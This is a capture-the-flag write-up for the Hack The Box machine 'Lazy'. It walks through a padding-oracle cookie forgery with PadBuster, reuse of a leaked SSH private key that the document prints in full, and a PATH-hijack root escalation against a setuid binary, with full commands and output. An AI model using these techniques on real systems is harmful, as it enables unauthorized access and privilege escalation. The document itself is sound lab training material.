# HTB - Lazy  10.10.10.18


- Linux 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
- Ubuntu 14.04.5 LTS  

- Register and get auth cookie
- Use Padbuster to decrypt : user=bdmin
- Use Padbuster to generate : user=admin
- Login with burp, download private key 
- ssh with private key
- sbit on ~/backup
- PATH exploit




# Walktrough
- https://resources.infosecinstitute.com/hack-the-box-htb-machines-walkthrough-series-lazy/#gref


## Nmap


```
 nmap -sC -sV -A  10.10.10.18 -p-
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-08 19:06 CEST
Nmap scan report for 10.10.10.18
Host is up (0.032s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: CompanyDev
```


## Register

![](images/lazy.png)


Register as bdmin:pass
With burp

=> Auth Cookie

```
POST /register.php HTTP/1.1
Host: 10.10.10.18
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.18/register.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Connection: close
Upgrade-Insecure-Requests: 1

username=bdmin&password=pass&password_again=pass

Response
HTTP/1.1 302 Found
Date: Sun, 08 Sep 2019 17:10:13 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Set-Cookie: auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N
```




## Play with Auth cookie

Let replay de Get / with Cookie: auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N
Cookie: auth=11111

HTTP/1.1 200 OK
Date: Sun, 08 Sep 2019 17:13:01 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Content-Length: 15
Connection: close
Content-Type: text/html

Invalid padding  =======>> This means it is vulnerable to the Oracle Padding Attack. A great explanation of this attack and how it can be automated with Padbuster can be found here.

https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html


## Padbuster : decrypt cookie

```
root@kali:~/htb/YoloToolbox/machines/htb/lazy# padbuster http://10.10.10.18/index.php ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N  8  -cookies auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N -encoding 0 

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 979

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1133	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (14/256) [Byte 8]
[+] Success: (142/256) [Byte 7]
[+] Success: (61/256) [Byte 6]
[+] Success: (110/256) [Byte 5]
[+] Success: (59/256) [Byte 4]
[+] Success: (31/256) [Byte 3]
[+] Success: (168/256) [Byte 2]
[+] Success: (163/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): bcb6010d11ea0df2
[+] Intermediate Bytes (HEX): 555fe7c096c070f3
[+] Plain Text: user=bdm

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (11/256) [Byte 8]
[+] Success: (247/256) [Byte 7]
[+] Success: (17/256) [Byte 6]
[+] Success: (237/256) [Byte 5]
[+] Success: (242/256) [Byte 4]
[+] Success: (255/256) [Byte 3]
[+] Success: (33/256) [Byte 2]
[+] Success: (35/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 690d30a486419dcd
[+] Intermediate Bytes (HEX): d5d8070b17ec0bf4
[+] Plain Text: in

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=bdmin

[+] Decrypted value (HEX): 757365723D62646D696E060606060606

[+] Decrypted value (Base64): dXNlcj1iZG1pbgYGBgYGBg==

-------------------------------------------------------
```

## Padbuster : generate cookie

```
root@kali:~/htb/YoloToolbox/machines/htb/lazy# padbuster http://10.10.10.18/index.php ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N  8  -cookies auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N -encoding 0 -plaintext user=admin

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 979

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	1133	N/A
2 **	255	200	15	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
[+] Success: (150/256) [Byte 2]
[+] Success: (190/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

[+] Success: (1/256) [Byte 8]
[+] Success: (36/256) [Byte 7]
[+] Success: (180/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (146/256) [Byte 4]
[+] Success: (50/256) [Byte 3]
[+] Success: (132/256) [Byte 2]
[+] Success: (135/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------

```


## Burp replay with cookie

Send
```
GET /index.php HTTP/1.1
Host: 10.10.10.18
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.18/register.php
Cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
Connection: close
Upgrade-Insecure-Requests: 1
```

Receive
```
HTTP/1.1 200 OK
Date: Sun, 08 Sep 2019 17:44:13 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Vary: Accept-Encoding
Content-Length: 1286
Connection: close
Content-Type: text/html

<html>
    <head>
        <title>CompanyDev</title>
        <link rel="stylesheet" media="screen" href="/css/bootstrap.css" />
        <link rel="stylesheet" media="screen" href="/css/companydev.css" />
    </head>
    <body>
      <div class="container-narrow">
        <div class="header">
          <div class="navbar navbar-fixed-top">
            <div class="nav-collapse collapse">
              <ul class="nav navbar-nav">
                                  <li><a href="/logout.php">Logout</a></li>
                              </ul>
            </div>
          </div>
        </div>
      </div>
      <div class="container">
        <div class="body-content">


<div class="row">
  <div class="col-lg-12">
              <center><img src="images/maxresdefault.jpg" alt="banner2"></center>
      <p>
      <p>
      <center><p>Tasos this is my ssh key, just in case, if you ever want to login and check something out.</p></center>
      <center><p><a href="mysshkeywithnamemitsos">My Key</a></p></center>
      <p>
      <p>
      	<center><img src="images/banner.png" alt="banner"></center>
        <p>
	<p>
	<center>You are currently logged in as admin!</center>
        <p>
        <p>
      </span>
  
  </div>
</div>



        </div>
      </div>


    </body>
</html>
```

## RSA Key

Download key : http://10.10.10.18/mysshkeywithnamemitsos

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqIkk7+JFhRPDbqA0D1ZB4HxS7Nn6GuEruDvTMS1EBZrUMa9r
upUZr2C4LVqd6+gm4WBDJj/CzAi+g9KxVGNAoT+Exqj0Z2a8Xpz7z42PmvK0Bgkk
3mwB6xmZBr968w9pznUio1GEf9i134x9g190yNa8XXdQ195cX6ysv1tPt/DXaYVq
OOheHpZZNZLTwh+aotEX34DnZLv97sdXZQ7km9qXMf7bqAuMop/ozavqz6ylzUHV
YKFPW3R7UwbEbkH+3GPf9IGOZSx710jTd1JV71t4avC5NNqHxUhZilni39jm/EXi
o1AC4ZKC1FqA/4YjQs4HtKv1AxwAFu7IYUeQ6QIDAQABAoIBAA79a7ieUnqcoGRF
gXvfuypBRIrmdFVRs7bGM2mLUiKBe+ATbyyAOHGd06PNDIC//D1Nd4t+XlARcwh8
g+MylLwCz0dwHZTY0WZE5iy2tZAdiB+FTq8twhnsA+1SuJfHxixjxLnr9TH9z2db
sootwlBesRBLHXilwWeNDyxR7cw5TauRBeXIzwG+pW8nBQt62/4ph/jNYabWZtji
jzSgHJIpmTO6OVERffcwK5TW/J5bHAys97OJVEQ7wc3rOVJS4I/PDFcteQKf9Mcb
+JHc6E2V2NHk00DPZmPEeqH9ylXsWRsirmpbMIZ/HTbnxJXKZJ8408p6Z+n/d8t5
gyoaRgECgYEA0oiSiVPb++auc5du9714TxLA5gpmaE9aaLNwEh4iLOS+Rtzp9jSp
b1auElzXPwACjKYpw709cNGV7bV8PPfBmtyNfHLeMTVf/E/jbRUO/000ZNznPnE7
SztdWk4UWPQx0lcSiShYymc1C/hvcgluKhdAi5m53MiPaNlmtORZ1sECgYEAzO61
apZQ0U629sx0OKn3YacY7bNQlXjl1bw5Lr0jkCIAGiquhUz2jpN7T+seTVPqHQbm
sClLuQ0vJEUAIcSUYOUbuqykdCbXSM3DqayNSiOSyk94Dzlh37Ah9xcCowKuBLnD
gl3dfVsRMNo0xppv4TUmq9//pe952MTf1z+7LCkCgYB2skMTo7DyC3OtfeI1UKBE
zIju6UwlYR/Syd/UhyKzdt+EKkbJ5ZTlTdRkS+2a+lF1pLUFQ2shcTh7RYffA7wm
qFQopsZ4reQI562MMYQ8EfYJK7ZAMSzB1J1kLYMxR7PTJ/4uUA4HRzrUHeQPQhvX
JTbhvfDY9kZMUc2jDN9NwQKBgQCI6VG6jAIiU/xYle9vi94CF6jH5WyI7+RdDwsE
9sezm4OF983wsKJoTo+rrODpuI5IJjwopO46C1zbVl3oMXUP5wDHjl+wWeKqeQ2n
ZehfB7UiBEWppiSFVR7b/Tt9vGSWM6Uyi5NWFGk/wghQRw1H4EKdwWECcyNsdts0
6xcZQQKBgQCB1C4QH0t6a7h5aAo/aZwJ+9JUSqsKat0E7ijmz2trYjsZPahPUsnm
+H9wn3Pf5kAt072/4N2LNuDzJeVVYiZUsDwGFDLiCbYyBVXgqtaVdHCfXwhWh1EN
pXoEbtCvgueAQmWpXVxaEiugA1eezU+bMiUmer1Qb/l1U9sNcW9DmA==
-----END RSA PRIVATE KEY-----
```

## ssh mitsos

```
# ssh -i lazy.key  mitsos@10.10.10.18
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Sep  8 19:56:21 EEST 2019

  System load: 0.0               Memory usage: 4%   Processes:       193
  Usage of /:  7.6% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Thu Jan 18 10:29:40 2018
mitsos@LazyClown:~$ 
$ cat user.txt
xxxxxxxxxxxxxxxxxxx
```


## Pric Esc

```
$ ls -al
total 68
drwxr-xr-x 5 mitsos mitsos 4096 Sep  8 20:53 .
drwxr-xr-x 3 root   root   4096 May  2  2017 ..
-rwsrwsr-x 1 root   root   7303 May  3  2017 backup
```

## backup

```
$ strace ./backup 
execve("./backup", ["./backup"], [/* 19 vars */]) = 0
brk(0)                                  = 0x804b000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21834, ...}) = 0
mmap2(NULL, 21834, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd2000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0P\234\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1763068, ...}) = 0
mmap2(NULL, 1768060, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e22000
mmap2(0xb7fcc000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1aa000) = 0xb7fcc000
mmap2(0xb7fcf000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fcf000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e21000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e21940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcc000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd2000, 21834)               = 0
rt_sigaction(SIGINT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGQUIT, {SIG_IGN, [], 0}, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffff5d0) = 1690
waitpid(1690, cat: /etc/shadow: Permission denied
[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0) = 1690
rt_sigaction(SIGINT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {SIG_DFL, [], 0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1690, si_status=1, si_utime=0, si_stime=0} ---
exit_group(0)                           = ?
+++ exited with 0 +++
mitsos@LazyClown:~$ 
```

On cherche les commandes

```
$ strings ./backup 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
cat /etc/shadow
;*2$"
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6591
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
_edata
_fini
__data_start
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init
```

On voit : la commande 'cat /etc/shadow'

## PATH exploit

On change le PATH
```
mitsos@LazyClown:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
mitsos@LazyClown:~$ which cat
/bin/cat
mitsos@LazyClown:~$ export PATH=.:$PATH
mitsos@LazyClown:~$ which cat
./cat
```

On créé un ficher cat
```
# vi cat
#!/bin/sh
/bin/sh
```
```
chmod a+x ./cat
```

On lance backup et on recupère notre shell root
```
mitsos@LazyClown:~$ ./backup 
# id
uid=1000(mitsos) gid=1000(mitsos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(mitsos)

# cd /root
# ls
root.txt
# cat root.txt
990b142c3cefd46a5e7d61f678d45515
# 



# uname -a
Linux LazyClown 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
# cat /etc/issue
Ubuntu 14.04.5 LTS \n \l


```


